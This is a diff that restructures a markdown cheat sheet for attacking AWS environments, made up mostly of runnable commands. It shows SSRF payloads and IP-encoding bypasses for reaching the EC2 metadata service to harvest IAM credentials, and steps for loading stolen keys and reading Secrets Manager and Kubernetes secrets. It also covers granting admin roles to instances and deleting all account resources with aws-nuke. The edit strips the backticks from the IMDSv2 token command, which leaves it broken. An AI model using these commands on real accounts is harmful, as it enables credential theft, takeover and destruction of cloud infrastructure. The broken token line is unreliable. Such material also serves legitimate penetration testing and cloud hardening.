@@ -1,46 +1,51 @@
 # Cheat Sheet
 
-## AWS basic info
+## Auth methods:
 
 ```
-Auth methods:
 • Programmatic access - Access + Secret Key
-   ◇ Secret Access Key and Access Key ID for authenticating via scripts and CLI
+◇ Secret Access Key and Access Key ID for authenticating via scripts and CLI
 • Management Console Access
-   ◇ Web Portal Access to AWS
+◇ Web Portal Access to AWS
+```
 
-Recon:
+## Recon:
+
+```
 • AWS Usage
-   ◇ Some web applications may pull content directly from S3 buckets
-   ◇ Look to see where web resources are being loaded from to determine if S3 buckets are being utilized
-   ◇ Burp Suite
-   ◇ Navigate application like you normally would and then check for any requests to:
-      ▪ https://[bucketname].s3.amazonaws.com
-      ▪ https://s3-[region].amazonaws.com/[OrgName]
-
-S3:
+◇ Some web applications may pull content directly from S3 buckets
+◇ Look to see where web resources are being loaded from to determine if S3 buckets are being utilized
+◇ Burp Suite
+◇ Navigate application like you normally would and then check for any requests to:
+▪ https://[bucketname].s3.amazonaws.com
+▪ https://s3-[region].amazonaws.com/[OrgName]
 • Amazon Simple Storage Service (S3)
-   ◇ Storage service that is “secure by default”
-   ◇ Configuration issues tend to unsecure buckets by making them publicly accessible
-   ◇ Nslookup can help reveal region
-   ◇ S3 URL Format:
-      ▪ https://[bucketname].s3.amazonaws.com
-      ▪ https://s3-[region].amazonaws.com/[Org Name]
-        # aws s3 ls s3://bucket-name-here --region 
-        # aws s3api get-bucket-acl --bucket bucket-name-here
-        # aws s3 cp readme.txt  s3://bucket-name-here --profile newuserprofile
+◇ Storage service that is “secure by default”
+◇ Configuration issues tend to unsecure buckets by making them publicly accessible
+◇ Nslookup can help reveal region
+◇ S3 URL Format:
+▪ https://[bucketname].s3.amazonaws.com
+▪ https://s3-[region].amazonaws.com/[Org Name]
+aws s3 ls s3://bucket-name-here --region
+aws s3api get-bucket-acl --bucket bucket-name-here
+aws s3 cp readme.txt s3://bucket-name-here --profile newuserprofile
+```
 
-EBS Volumes:
-• Elastic Block Store (EBS)
+### EBS Volumes:
+
+```
 • AWS virtual hard disks
+• Elastic Block Store (EBS)
 • Can have similar issues to S3 being publicly available
 • Difficult to target specific org but can find widespread leaks
+```
 
-EC2:
+### EC2:
+
+```
 • Like virtual machines
 • SSH keys created when started, RDP for Windows.
 • Security groups to handle open ports and allowed IPs.
-
 AWS Instance Metadata URL
 • Cloud servers hosted on services like EC2 needed a way to orient themselves because of how dynamic they are
 • A “Metadata” endpoint was created and hosted on a non-routable IP address at 169.254.169.254
@@ -48,55 +53,57 @@ AWS Instance Metadata URL
 • This should only be reachable from the localhost
 • Server compromise or SSRF vulnerabilities might allow remote attackers to reach it
 • IAM credentials can be stored here:
-   ◇ http://169.254.169.254/latest/meta-data/iam/security-credentials/
+◇ http://169.254.169.254/latest/meta-data/iam/security-credentials/
 • Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS.
-   ◇ curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
+◇ curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
 • CapitalOne Hack
-   ◇ Attacker exploited SSRF on EC2 server and accessed metadata URL to get IAM access keys. Then, used keys to dump S3 bucket containing 100 million individual’s data.
+◇ Attacker exploited SSRF on EC2 server and accessed metadata URL to get IAM access keys. Then, used keys to dump S3 bucket containing 100 million individual’s data.
 • AWS EC2 Instance Metadata service Version 2 (IMDSv2)
 • Updated in November 2019 – Both v1 and v2 are available
 • Supposed to defend the metadata service against SSRF and reverse proxy vulns
 • Added session auth to requests
 • First, a “PUT” request is sent and then responded to with a token
 • Then, that token can be used to query data
---
-TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+TOKEN=curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
 curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
 curl http://example.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
---
+```
 
-Post-compromise
-• What do our access keys give us access to?
+## Post-compromise
+
+```
+What do our access keys give us access to?
 • Check AIO tools to do some recon (WeirdAAL- recon_module, PACU privesc,...)
-
 http://169.254.169.254/latest/meta-data
-http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
-
-# AWS nuke - remove all AWS services of our account
-# https://github.com/rebuy-de/aws-nuke
-- Fill nuke-config.yml with the output of aws sts get-caller-identity
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+AWS nuke - remove all AWS services of our account
+https://github.com/rebuy-de/aws-nuke
+Fill nuke-config.yml with the output of aws sts get-caller-identity
 ./aws-nuke -c nuke-config.yml # Checks what will be removed
-- If fails because there is no alias created
+If fails because there is no alias created
 aws iam create-account-alias --account-alias unique-name
 ./aws-nuke -c nuke-config.yml --no-dry-run # Will perform delete operation
-
-# Cloud Nuke
-# https://github.com/gruntwork-io/cloud-nuke
+Cloud Nuke
+https://github.com/gruntwork-io/cloud-nuke
 cloud-nuke aws
+```
 
-# Other bypasses
-1.
+### Other bypasses
+
+```
 aws eks list-clusters | jq -rc '.clusters'
 ["example"]
 aws eks update-kubeconfig --name example
 kubectl get secrets
-
-2. SSRF AWS Bypasses to access metadata endpoint.
+SSRF AWS Bypasses to access metadata endpoint.
 Converted Decimal IP: http://2852039166/latest/meta-data/
 IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
 IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
+```
 
-# Interesting metadata instance urls:
+### Interesting metadata instance urls:
+
+```
 http://instance-data
 http://169.254.169.254
 http://169.254.169.254/latest/user-data
@@ -115,7 +122,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
 http://169.254.169.254/latest/dynamic/instance-identity/document
 ```
 
-### Find Aws Domain
+## Find Aws Domain
 
 ```
 # Find subdomains
@@ -136,7 +143,9 @@ ruby lazys3.rb companyname
 slurp domain -t example.com
 ```
 
-### AIO AWS tools
+## AIO AWS tools
+
+### WeirdALL
 
 ```
 # https://github.com/carnal0wnage/weirdAAL
@@ -144,33 +153,64 @@ pip3 install -r requirements
 cp env.sample .env
 vim .env
 python3 weirdAAL.py -l
+```
 
+### Pacu
+
+```
 # https://github.com/RhinoSecurityLabs/pacu
 bash install.sh
 python3 pacu.py
 import_keys --all
 ls
+```
 
+### Others
+
+```
 # https://github.com/dagrz/aws_pwn
 # Lot of scripts for different purposes, check github
+```
 
-# IAM resources finder
-# https://github.com/BishopFox/smogcloud
-smogcloud
-
+```
 # Red team scripts for AWS
 # https://github.com/elitest/Redboto
+```
 
-# AWS Bloodhound
-# https://github.com/lyft/cartography
-
-# AWS Exploitation Framework
+```
+ AWS Exploitation Framework
 # https://github.com/grines/scour
 ```
 
-### IAM
 
-#### Basic command
+
+## IAM
+
+## Prefix meaning
+
+ABIA - AWS STS service bearer token&#x20;
+
+ACCA - Context-specific credential&#x20;
+
+AGPA - Group AIDA - IAM user&#x20;
+
+AIPA - Amazon EC2 instance profile
+
+&#x20;AKIA - Access key&#x20;
+
+ANPA - Managed policy&#x20;
+
+ANVA - Version in a managed policy
+
+&#x20;APKA - Public key&#x20;
+
+AROA - Role&#x20;
+
+ASCA - Certificate&#x20;
+
+ASIA - Temporary (AWS STS) access key IDs use this prefix, but are unique only in combination with the secret access key and the session token.
+
+### Credentials :
 
 ```
 # ~/.aws/credentials
@@ -181,20 +221,22 @@ aws_secret_access_key = XXXX
 export AWS_ACCESS_KEY_ID=
 export AWS_SECRET_ACCESS_KEY=
 export AWS_DEFAULT_REGION=
+```
 
-# Check valid
+### Check identity :&#x20;
+
+```
 aws sts get-caller-identity
+aws sts get-access-key-info --access-key-id=ASIA1234567890123456
 aws sdb list-domains --region us-east-1
-
-# If we can steal AWS credentials, add to your configuration
-aws configure --profile stolen
 # Open ~/.aws/credentials
 # Under the [stolen] section add aws_session_token and add the discovered token value here
 aws sts get-caller-identity --profile stolen
+```
 
-# Get account id
-aws sts get-access-key-info --access-key-id=ASIA1234567890123456
+### Recon:
 
+```
 aws iam get-account-password-policy
 aws sts get-session-token
 aws iam list-users
@@ -204,33 +246,15 @@ aws iam create-access-key --user-name <username>
 aws iam list-attached-user-policies --user-name XXXX
 aws iam get-policy
 aws iam get-policy-version
-
 aws deploy list-applications
-
 aws directconnect describe-connections
-
 aws secretsmanager get-secret-value --secret-id <value> --profile <container tokens>
-
 aws sns publish --topic-arn arn:aws:sns:us-east-1:*account id*:aaa --message aaa
+```
 
-# IAM Prefix meaning
-ABIA - AWS STS service bearer token
-ACCA - Context-specific credential
-AGPA - Group
-AIDA - IAM user
-AIPA - Amazon EC2 instance profile
-AKIA - Access key
-ANPA - Managed policy
-ANVA - Version in a managed policy
-APKA - Public key
-AROA - Role
-ASCA - Certificate
-ASIA - Temporary (AWS STS) access key IDs use this prefix, but are unique only in combination with the secret access key and the session token.
+### Get policies&#x20;
 
-# First of all, set your profile
-aws configure --profile test 
-set profile=test # Just for convenience
-
+```
 # Get policies available
 aws --profile "$profile" iam list-policies | jq -r ".Policies[].Arn"
 # Get specific policy version
@@ -252,6 +276,7 @@ aws --profile "test" iam list-group-policies --group-name "test-group"
 #List Inline Role policies
 aws --profile "test" iam list-role-policies --role-name "test-role"
 
+
 #Describe Inline User policies 
 aws --profile "test" iam get-user-policy --user-name "test-user" --policy-name "test-policy"
 #Describe Inline Group policies
@@ -262,40 +287,47 @@ aws --profile "test" iam get-role-policy --role-name "test-role" --policy-name "
 # List roles policies
 aws --profile "test" iam get-role --role-name "test-role" 
 
-# Assume role from any ec2 instance (get Admin)
-# Create instance profile
-aws iam create-instance-profile --instance-profile-name YourNewRole-Instance-Profile
-# Associate role to Instance Profile
-aws iam add-role-to-instance-profile --role-name YourNewRole --instance-profile-name YourNewRole-Instance-Profile
-# Associate Instance Profile with instance you want to use
-aws ec2 associate-iam-instance-profile --instance-id YourInstanceId --iam-instance-profile Name=YourNewRole-Instance-Profile
+# Get service control policy
+aws organizations list-policies-for-target --filter SERVICE_CONTROL_POLICY --target-id {}
+```
 
-# Get token for specific role
+### Assume role from any ec2 instance (get Admin)
+
+```
+Create instance profile
+aws iam create-instance-profile --instance-profile-name YourNewRole-Instance-Profile
+Associate role to Instance Profile
+aws iam add-role-to-instance-profile --role-name YourNewRole --instance-profile-name YourNewRole-Instance-Profile
+Associate Instance Profile with instance you want to use
+aws ec2 associate-iam-instance-profile --instance-id YourInstanceId --iam-instance-profile Name=YourNewRole-Instance-Profile
+```
+
+### Get token for specific role
+
+```
 aws sts assume-role --role-arn arn:aws:iam::276384657722:role/ad-LoggingRole --role-session-name ad_logging
 export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
 $ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 $ export AWS_SESSION_TOKEN=AQoDYXdzEJr...<remainder of session token>
 $ aws ec2 describe-instances --region us-west-1
+```
 
-# Get assumed roles in instance
+### Get assumed roles in instance
+
+```
 aws --profile test sts get-caller-identity
+```
 
-# Shadow admin
+### Shadow admin
+
+```
 aws iam list-attached-user-policies --user-name {}
 aws iam get-policy-version --policy-arn provide_policy_arn --version-id $(aws iam get-policy --policy-arn provide_policy_arn --query 'Policy.DefaultVersionId' --output text)
 aws iam list-user-policies --user-name {}
 aws iam get-user-policy --policy-name policy_name_from_above_command --user-name {} | python -m json.tool
-# Vulnerables policies:
-iam:CreatUser
-iam:CreateLoginProfile
-iam:UpdateProfile
-iam:AddUserToGroup
-
-# Get service control policy
-aws organizations list-policies-for-target --filter SERVICE_CONTROL_POLICY --target-id {}
 ```
 
-TOOLS
+### TOOLS
 
 ```
 # https://github.com/andresriancho/enumerate-iam
